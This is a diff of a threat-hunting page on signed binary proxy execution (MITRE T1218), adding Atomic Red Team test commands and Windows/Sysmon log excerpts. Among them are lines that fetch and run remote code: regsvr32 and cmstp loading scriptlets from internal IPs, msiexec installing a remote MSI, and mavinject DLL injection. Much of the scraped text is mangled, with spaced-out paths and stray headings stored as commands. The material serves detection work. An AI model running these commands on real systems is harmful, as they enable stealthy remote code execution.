@@ -27,21 +27,150 @@
 ## Potential Commands
 
 ```
-mavinject.exe 1000 /INJECTRUNNING #{dll_payload}
-
-mavinject.exe #{process_id} /INJECTRUNNING PathToAtomicsFolder\T1218\src\x64\T1218.dll
-
-SyncAppvPublishingServer.exe "n; Start-Process calc.exe"
-
 C:\Windows\SysWow64\Register-CimProvider.exe -Path PathToAtomicsFolder\T1218\src\Win32\T1218-2.dll
-
 InfDefaultInstall.exe PathToAtomicsFolder\T1218\src\Infdefaultinstall.inf
-
-C:\Program Files\Microsoft Office\Office16\protocolhandler.exe "ms-word:nft|u|#{remote_url}"
-
 #{microsoft_wordpath}\protocolhandler.exe "ms-word:nft|u|https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218/src/T1218Test.docx"
-
+SyncAppvPublishingServer.exe "n; Start-Process calc.exe"
+mavinject.exe 1000 /INJECTRUNNING #{dll_payload}
+C:\Program Files\Microsoft Office\Office16\protocolhandler.exe "ms-word:nft|u|#{remote_url}"
+mavinject.exe #{process_id} /INJECTRUNNING PathToAtomicsFolder\T1218\src\x64\T1218.dll
 mavinject.exe|SyncAppvPublishingServer.exe
+Log
+windows security log
+Event ID: 4688
+Process information:
+New Process ID: 0x9b0
+New Process Name: C: \ Windows \ System32 \ cmstp.exe
+
+sysmon log
+Event ID: 1
+OriginalFileName: CMSTP.EXE
+CommandLine: cmstp.exe / ni / s C: \ Users \ 12306Br0 \ Desktop \ a \ add.inf
+CurrentDirectory: C: \ Windows \ system32 \
+User: 12306Br0-PC \ 12306Br0
+LogonGuid: {bb1f7c32-5fc3-5e99-0000-0020eae10600}
+LogonId: 0x6e1ea
+TerminalSessionId: 1
+IntegrityLevel: High
+Hashes: SHA1 = BA135738EF1FB2F4C2C6C610BE2C4E855A526668
+ParentProcessGuid: {bb1f7c32-fdb7-5e9a-0000-0010563b2d00}
+ParentProcessId: 1988
+ParentImage: C: \ Windows \ System32 \ cmd.exe
+ParentCommandLine: "C: \ Windows \ System32 \ cmd.exe"
+Inf
+    [Version]
+    Signature = $ chicago $
+    AdvancedINF = 2.5
+    [DefaultInstall_SingleUser]
+    UnRegisterOCXs = UnRegisterOCXSection
+    [UnRegisterOCXSection]
+    % 11% \ scrobj.dll, NI, http: //192.168.1.4/cmstp_rev_53_x64.sct
+    [Strings]
+    AppAct = "SOFTWARE \ Microsoft \ Connection Manager"
+    ServiceName = "Micropoor"
+    ShortSvcName = "Micropoor"
+## inf file contents
+Bash
+EventID: 4688 # security logs, windows server 2012 above configuration audit policy, command parameters can be recorded
+Log
+# Windows security log
+Event ID: 4688
+Process information:
+New Process ID: 0xe78
+New Process Name: C: \ Windows \ System32 \ msiexec.exe
+
+# Sysmon log
+Event ID: 1
+UtcTime: 2020-04-18 14: 04: 16.596
+ProcessGuid: {bb1f7c32-08e0-5e9b-0000-0010b8ff3f01}
+ProcessId: 3704
+Image: C: \ Windows \ System32 \ msiexec.exe
+FileVersion: 5.0.7601.17514 (win7sp1_rtm.101119-1850)
+Description: Windows installer
+Product: Windows Installer - Unicode
+Company: Microsoft Corporation
+OriginalFileName: msiexec.exe
+CommandLine: msiexec / q / i http://192.168.126.146/1.msi
+CurrentDirectory: C: \ Users \ 12306Br0 \
+User: 12306Br0-PC \ 12306Br0
+LogonGuid: {bb1f7c32-5fc3-5e99-0000-00201ae20600}
+LogonId: 0x6e21a
+TerminalSessionId: 1
+IntegrityLevel: Medium
+Hashes: SHA1 = 443AAC22D57EDD4EF893E2A245B356CBA5B2C2DD
+ParentProcessGuid: {bb1f7c32-08db-5e9b-0000-001049f63d01}
+ParentProcessId: 1900
+ParentImage: C: \ Windows \ System32 \ cmd.exe
+ParentCommandLine: "C: \ Windows \ system32 \ cmd.exe"
+Dos
+ Msiexec.exe / q /i"C:\path\to\file.msi "
+
+ Msiexec.exe / q / i http [:] // site com / file.msi [.]
+
+ Msiexec.exe / y "C: \ path \ to \ file.dll"
+It can be detected for the following command parameters.
+Log
+windows security log
+Event ID: 4688
+Process information:
+New Process ID: 0xfec
+New Process Name: C: \ Windows \ SysWOW64 \ odbcconf.exe
+
+Event ID: 4688
+Process information:
+New Process ID: 0x390
+New Process Name: C: \ Windows \ SysWOW64 \ rundll32.exe
+
+sysmon log
+Event ID: 1
+Image: C: \ Windows \ SysWOW64 \ odbcconf.exe
+FileVersion: 6.1.7600.16385 (win7_rtm.090713-1255)
+Description: ODBC Driver Configuration Program
+Product: Microsoft Windows Operating System
+Company: Microsoft Corporation
+OriginalFileName: odbcconf.exe
+CommandLine: C: \ Windows \ SysWOW64 \ odbcconf.exe / a {regsvr C: \ payload.dll}
+CurrentDirectory: C: \
+User: 12306Br0-PC \ 12306Br0
+LogonGuid: {bb1f7c32-5fc3-5e99-0000-00201ae20600}
+LogonId: 0x6e21a
+TerminalSessionId: 1
+IntegrityLevel: Medium
+Hashes: SHA1 = B1C49B2159C237B1F2BCE2D40508113E39143F7B
+ParentProcessGuid: {bb1f7c32-f65d-5e9a-0000-0010833eef00}
+ParentProcessId: 3868
+ParentImage: C: \ Windows \ System32 \ cmd.exe
+ParentCommandLine: "C: \ Windows \ system32 \ cmd.exe"
+
+Event ID: 1
+Image: C: \ Windows \ SysWOW64 \ rundll32.exe
+FileVersion: 6.1.7600.16385 (win7_rtm.090713-1255)
+Description: Windows host process (Rundll32)
+Product: Microsoft Windows Operating System
+Company: Microsoft Corporation
+OriginalFileName: RUNDLL32.EXE
+CommandLine: rundll32.exe
+CurrentDirectory: C: \
+User: 12306Br0-PC \ 12306Br0
+LogonGuid: {bb1f7c32-5fc3-5e99-0000-00201ae20600}
+LogonId: 0x6e21a
+TerminalSessionId: 1
+IntegrityLevel: Medium
+Hashes: SHA1 = 8939CF35447B22DD2C6E6F443446ACC1BF986D58
+ParentProcessGuid: {bb1f7c32-f662-5e9a-0000-0010d648ef00}
+ParentProcessId: 4076
+ParentImage: C: \ Windows \ SysWOW64 \ odbcconf.exe
+ParentCommandLine: C: \ Windows \ SysWOW64 \ odbcconf.exe / a {regsvr C: \ payload.dll}
+Log
+EventID: 1
+Image: C: \ Windows \ System32 \ regsvr32.exe
+FileVersion: 6.1.7600.16385 (win7_rtm.090713-1255)
+Description: Microsoft (C) Register Server
+Product: Microsoft Windows Operating System
+Company: Microsoft Corporation
+OriginalFileName: REGSVR32.EXE
+CommandLine: regsvr32 / s / n / u /i:http://192.168.126.146:8080/06Yud7aXXqYqT.sct scrobj.dll
+# Sysmon log
 ```
 
 ## Commands Dataset
@@ -76,7 +205,167 @@ mavinject.exe|SyncAppvPublishingServer.exe
   'source': 'atomics/T1218/T1218.yaml'},
  {'command': 'mavinject.exe|SyncAppvPublishingServer.exe',
   'name': None,
-  'source': 'SysmonHunter - Signed Binary Proxy Execution'}]
+  'source': 'SysmonHunter - Signed Binary Proxy Execution'},
+ {'command': 'Log\n'
+             'windows security log\n'
+             'Event ID: 4688\n'
+             'Process information:\n'
+             'New Process ID: 0x9b0\n'
+             'New Process Name: C: \\ Windows \\ System32 \\ cmstp.exe\n'
+             '\n'
+             'sysmon log\n'
+             'Event ID: 1\n'
+             'OriginalFileName: CMSTP.EXE\n'
+             'CommandLine: cmstp.exe / ni / s C: \\ Users \\ 12306Br0 \\ '
+             'Desktop \\ a \\ add.inf\n'
+             'CurrentDirectory: C: \\ Windows \\ system32 \\\n'
+             'User: 12306Br0-PC \\ 12306Br0\n'
+             'LogonGuid: {bb1f7c32-5fc3-5e99-0000-0020eae10600}\n'
+             'LogonId: 0x6e1ea\n'
+             'TerminalSessionId: 1\n'
+             'IntegrityLevel: High\n'
+             'Hashes: SHA1 = BA135738EF1FB2F4C2C6C610BE2C4E855A526668\n'
+             'ParentProcessGuid: {bb1f7c32-fdb7-5e9a-0000-0010563b2d00}\n'
+             'ParentProcessId: 1988\n'
+             'ParentImage: C: \\ Windows \\ System32 \\ cmd.exe\n'
+             'ParentCommandLine: "C: \\ Windows \\ System32 \\ cmd.exe"',
+  'name': 'Log',
+  'source': 'https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}'},
+ {'command': '## inf file contents',
+  'name': '## inf file contents',
+  'source': 'https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}'},
+ {'command': 'Inf\n'
+             '    [Version]\n'
+             '    Signature = $ chicago $\n'
+             '    AdvancedINF = 2.5\n'
+             '    [DefaultInstall_SingleUser]\n'
+             '    UnRegisterOCXs = UnRegisterOCXSection\n'
+             '    [UnRegisterOCXSection]\n'
+             '    % 11% \\ scrobj.dll, NI, http: '
+             '//192.168.1.4/cmstp_rev_53_x64.sct\n'
+             '    [Strings]\n'
+             '    AppAct = "SOFTWARE \\ Microsoft \\ Connection Manager"\n'
+             '    ServiceName = "Micropoor"\n'
+             '    ShortSvcName = "Micropoor"',
+  'name': 'Inf',
+  'source': 'https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}'},
+ {'command': 'Bash\n'
+             'EventID: 4688 # security logs, windows server 2012 above '
+             'configuration audit policy, command parameters can be recorded',
+  'name': 'Bash',
+  'source': 'https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}'},
+ {'command': 'Log\n'
+             '# Windows security log\n'
+             'Event ID: 4688\n'
+             'Process information:\n'
+             'New Process ID: 0xe78\n'
+             'New Process Name: C: \\ Windows \\ System32 \\ msiexec.exe\n'
+             '\n'
+             '# Sysmon log\n'
+             'Event ID: 1\n'
+             'UtcTime: 2020-04-18 14: 04: 16.596\n'
+             'ProcessGuid: {bb1f7c32-08e0-5e9b-0000-0010b8ff3f01}\n'
+             'ProcessId: 3704\n'
+             'Image: C: \\ Windows \\ System32 \\ msiexec.exe\n'
+             'FileVersion: 5.0.7601.17514 (win7sp1_rtm.101119-1850)\n'
+             'Description: Windows installer\n'
+             'Product: Windows Installer - Unicode\n'
+             'Company: Microsoft Corporation\n'
+             'OriginalFileName: msiexec.exe\n'
+             'CommandLine: msiexec / q / i http://192.168.126.146/1.msi\n'
+             'CurrentDirectory: C: \\ Users \\ 12306Br0 \\\n'
+             'User: 12306Br0-PC \\ 12306Br0\n'
+             'LogonGuid: {bb1f7c32-5fc3-5e99-0000-00201ae20600}\n'
+             'LogonId: 0x6e21a\n'
+             'TerminalSessionId: 1\n'
+             'IntegrityLevel: Medium\n'
+             'Hashes: SHA1 = 443AAC22D57EDD4EF893E2A245B356CBA5B2C2DD\n'
+             'ParentProcessGuid: {bb1f7c32-08db-5e9b-0000-001049f63d01}\n'
+             'ParentProcessId: 1900\n'
+             'ParentImage: C: \\ Windows \\ System32 \\ cmd.exe\n'
+             'ParentCommandLine: "C: \\ Windows \\ system32 \\ cmd.exe"',
+  'name': 'Log',
+  'source': 'https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}'},
+ {'command': 'It can be detected for the following command parameters.',
+  'name': 'It can be detected for the following command parameters.',
+  'source': 'https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}'},
+ {'command': 'Dos\n'
+             ' Msiexec.exe / q /i"C:\\path\\to\\file.msi "\n'
+             '\n'
+             ' Msiexec.exe / q / i http [:] // site com / file.msi [.]\n'
+             '\n'
+             ' Msiexec.exe / y "C: \\ path \\ to \\ file.dll"',
+  'name': 'Dos',
+  'source': 'https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}'},
+ {'command': 'Log\n'
+             'windows security log\n'
+             'Event ID: 4688\n'
+             'Process information:\n'
+             'New Process ID: 0xfec\n'
+             'New Process Name: C: \\ Windows \\ SysWOW64 \\ odbcconf.exe\n'
+             '\n'
+             'Event ID: 4688\n'
+             'Process information:\n'
+             'New Process ID: 0x390\n'
+             'New Process Name: C: \\ Windows \\ SysWOW64 \\ rundll32.exe\n'
+             '\n'
+             'sysmon log\n'
+             'Event ID: 1\n'
+             'Image: C: \\ Windows \\ SysWOW64 \\ odbcconf.exe\n'
+             'FileVersion: 6.1.7600.16385 (win7_rtm.090713-1255)\n'
+             'Description: ODBC Driver Configuration Program\n'
+             'Product: Microsoft Windows Operating System\n'
+             'Company: Microsoft Corporation\n'
+             'OriginalFileName: odbcconf.exe\n'
+             'CommandLine: C: \\ Windows \\ SysWOW64 \\ odbcconf.exe / a '
+             '{regsvr C: \\ payload.dll}\n'
+             'CurrentDirectory: C: \\\n'
+             'User: 12306Br0-PC \\ 12306Br0\n'
+             'LogonGuid: {bb1f7c32-5fc3-5e99-0000-00201ae20600}\n'
+             'LogonId: 0x6e21a\n'
+             'TerminalSessionId: 1\n'
+             'IntegrityLevel: Medium\n'
+             'Hashes: SHA1 = B1C49B2159C237B1F2BCE2D40508113E39143F7B\n'
+             'ParentProcessGuid: {bb1f7c32-f65d-5e9a-0000-0010833eef00}\n'
+             'ParentProcessId: 3868\n'
+             'ParentImage: C: \\ Windows \\ System32 \\ cmd.exe\n'
+             'ParentCommandLine: "C: \\ Windows \\ system32 \\ cmd.exe"\n'
+             '\n'
+             'Event ID: 1\n'
+             'Image: C: \\ Windows \\ SysWOW64 \\ rundll32.exe\n'
+             'FileVersion: 6.1.7600.16385 (win7_rtm.090713-1255)\n'
+             'Description: Windows host process (Rundll32)\n'
+             'Product: Microsoft Windows Operating System\n'
+             'Company: Microsoft Corporation\n'
+             'OriginalFileName: RUNDLL32.EXE\n'
+             'CommandLine: rundll32.exe\n'
+             'CurrentDirectory: C: \\\n'
+             'User: 12306Br0-PC \\ 12306Br0\n'
+             'LogonGuid: {bb1f7c32-5fc3-5e99-0000-00201ae20600}\n'
+             'LogonId: 0x6e21a\n'
+             'TerminalSessionId: 1\n'
+             'IntegrityLevel: Medium\n'
+             'Hashes: SHA1 = 8939CF35447B22DD2C6E6F443446ACC1BF986D58\n'
+             'ParentProcessGuid: {bb1f7c32-f662-5e9a-0000-0010d648ef00}\n'
+             'ParentProcessId: 4076\n'
+             'ParentImage: C: \\ Windows \\ SysWOW64 \\ odbcconf.exe\n'
+             'ParentCommandLine: C: \\ Windows \\ SysWOW64 \\ odbcconf.exe / a '
+             '{regsvr C: \\ payload.dll}',
+  'name': 'Log',
+  'source': 'https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}'},
+ {'command': 'Log\n'
+             'EventID: 1\n'
+             'Image: C: \\ Windows \\ System32 \\ regsvr32.exe\n'
+             'FileVersion: 6.1.7600.16385 (win7_rtm.090713-1255)\n'
+             'Description: Microsoft (C) Register Server\n'
+             'Product: Microsoft Windows Operating System\n'
+             'Company: Microsoft Corporation\n'
+             'OriginalFileName: REGSVR32.EXE\n'
+             'CommandLine: regsvr32 / s / n / u '
+             '/i:http://192.168.126.146:8080/06Yud7aXXqYqT.sct scrobj.dll\n'
+             '# Sysmon log',
+  'name': 'Log',
+  'source': 'https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}'}]
 ```
 
 ## Potential Detections
